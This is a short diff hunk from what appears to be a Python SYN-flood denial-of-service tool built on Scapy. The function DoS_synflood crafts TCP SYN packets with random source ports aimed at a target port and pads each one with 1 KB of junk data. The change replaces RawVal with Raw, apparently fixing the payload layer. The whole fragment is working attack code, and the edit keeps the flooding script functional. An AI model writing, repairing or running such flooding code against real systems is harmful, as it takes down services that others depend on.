@@ -135,7 +135,7 @@ def DoS_synflood():
     tcp = TCP(sport=RandShort(), dport=int(target_port), flags="S")
     
     # add some flooding data (1kb in this case)
-    raw = RawVal(b"X"*1024)
+    raw = Raw(b"X"*1024)
 
     # stack up the layers
     p = ip / tcp / raw 
